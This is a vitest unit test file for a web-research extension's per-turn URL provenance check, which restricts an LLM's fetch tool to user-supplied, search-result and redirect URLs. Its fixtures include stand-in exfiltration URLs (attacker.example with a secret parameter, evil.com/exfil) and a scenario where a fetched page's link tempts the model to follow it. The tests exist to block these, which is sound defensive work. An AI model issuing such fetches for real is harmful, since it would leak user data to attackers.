// tests/unit/webResearchProvenance.test.ts — Layer 2 provenance tests (M65 C5).

import { describe, it, expect, beforeEach } from 'vitest';

let ext: any;
let DOMParserCtor: any;

async function loadDOMParser() {
  if (DOMParserCtor) return DOMParserCtor;
  try {
    const mod: any = await import('jsdom');
    DOMParserCtor = class { parseFromString(s: string) { return new mod.JSDOM(s).window.document; } };
  } catch {
    const mod: any = await import('happy-dom');
    DOMParserCtor = class { parseFromString(s: string) { const w = new mod.Window(); w.document.write(s); return w.document; } };
  }
  return DOMParserCtor;
}

// Import the extension via dynamic import — its top-level `export` syntax is
// a real ES module and vitest can load it directly.
beforeEach(async () => {
  ext = await import('../../ext/web-research/main.js');
  ext.__test__._setDOMParser(await loadDOMParser());
  ext.__test__.resetTurn('t1');
  ext.__test__.resetTurn('t2');
});

describe('canonicalUrl — provenance comparison shape', () => {
  it('agrees with the bridge: lowercase host+scheme, no fragment, strip trailing /', () => {
    const c = ext.__test__.canonicalUrl;
    expect(c('HTTPS://Example.COM/A?x=1#frag')).toBe('https://example.com/A?x=1');
    expect(c('https://example.com/')).toBe('https://example.com');
  });
});

describe('seedTurnFromUserMessage (C5)', () => {
  it('lexes https:// URLs from the user message into the turn set', () => {
    ext.__test__.seedTurnFromUserMessage('t1', 'check https://Foo.com/x and also https://bar.org/path?q=1');
    expect(ext.__test__._isUrlAllowedThisTurn('t1', 'https://foo.com/x')).toBe(true);
    expect(ext.__test__._isUrlAllowedThisTurn('t1', 'https://bar.org/path?q=1')).toBe(true);
  });
  it('does not lex http:// URLs (only https — bridge would reject http anyway)', () => {
    ext.__test__.seedTurnFromUserMessage('t1', 'http://nope.com/x');
    expect(ext.__test__._isUrlAllowedThisTurn('t1', 'http://nope.com/x')).toBe(false);
  });
});

describe('webFetchTool — provenance rejection of fabricated URL', () => {
  it('rejects with NOT_IN_PROVENANCE when LLM hands a URL the user never typed', async () => {
    // No seeding; the turn is empty.
    const res = await ext.__test__.webFetchTool({ url: 'https://attacker.example/?secret=abc' }, 't1');
    expect(res.isError).toBe(true);
    expect(res.errorCode).toBe('NOT_IN_PROVENANCE');
  });
});

describe('webFetchTool — depth-1 hard stop (C5 + milestone)', () => {
  it('URLs lexed from the FETCHED PAGE BODY are NOT added to provenance', async () => {
    // Seed the turn with one URL.
    ext.__test__.seedTurnFromUserMessage('t1', 'https://allowed.example/start');

    // Stub the bridge: webFetch returns HTML body containing a link to evil.com.
    ext.__test__._setBridge({
      webFetch: {
        request: async ({ url }: { url: string }) => ({
          ok: true,
          result: {
            status: 200,
            finalUrl: url,
            contentType: 'text/html',
            body: '<html><body><p>hi</p><a href="https://evil.com/exfil?x=1">click me</a></body></html>',
          },
        }),
      },
    });

    const r1 = await ext.__test__.webFetchTool({ url: 'https://allowed.example/start' }, 't1');
    expect(r1.isError).toBe(false);

    // The model "extracts" the link from the response and tries to fetch it.
    const r2 = await ext.__test__.webFetchTool({ url: 'https://evil.com/exfil?x=1' }, 't1');
    expect(r2.isError).toBe(true);
    expect(r2.errorCode).toBe('NOT_IN_PROVENANCE');
  });
});

describe('webFetchTool — redirect final URL is added to provenance', () => {
  it('a follow-up fetch of the redirect destination is allowed', async () => {
    ext.__test__.seedTurnFromUserMessage('t1', 'https://allowed.example/start');
    ext.__test__._setBridge({
      webFetch: {
        request: async ({ url }: { url: string }) => ({
          ok: true,
          result: {
            status: 200,
            finalUrl: 'https://final.example/landed',  // simulated redirect destination
            contentType: 'text/html',
            body: '<html><body>ok</body></html>',
          },
        }),
      },
    });
    const r1 = await ext.__test__.webFetchTool({ url: 'https://allowed.example/start' }, 't1');
    expect(r1.isError).toBe(false);
    // The model now fetches the final URL directly.
    const r2 = await ext.__test__.webFetchTool({ url: 'https://final.example/landed' }, 't1');
    expect(r2.isError).toBe(false);
  });
});

describe('webSearch results are added to provenance', () => {
  it('after a successful search, the result urls become fetchable', async () => {
    ext.__test__._setGlobalStorage({
      get: async (k: string) => {
        if (k === ext.__test__.KEY_BRAVE_API_KEY) return 'test-key';
        return null;
      },
      set: async () => {},
    });
    ext.__test__._setBridge({
      webSearch: {
        request: async () => ({
          ok: true,
          result: {
            results: [
              { title: 'A', url: 'https://result-a.example/p', snippet: '' },
              { title: 'B', url: 'https://result-b.example/q', snippet: '' },
            ],
          },
        }),
      },
      webFetch: {
        request: async ({ url }: { url: string }) => ({
          ok: true,
          result: { status: 200, finalUrl: url, contentType: 'text/html', body: '<html><body>hi</body></html>' },
        }),
      },
    });

    const s = await ext.__test__.webSearchTool({ query: 'parallx' }, 't2');
    expect(s.isError).toBe(false);

    const f = await ext.__test__.webFetchTool({ url: 'https://result-a.example/p' }, 't2');
    expect(f.isError).toBe(false);
  });
});

describe('per-turn isolation (C5 — no persistence across turns)', () => {
  it('a URL allowed in turn t1 is NOT allowed in turn t2', async () => {
    ext.__test__.seedTurnFromUserMessage('t1', 'https://allowed.example/x');
    expect(ext.__test__._isUrlAllowedThisTurn('t1', 'https://allowed.example/x')).toBe(true);
    expect(ext.__test__._isUrlAllowedThisTurn('t2', 'https://allowed.example/x')).toBe(false);
  });
});
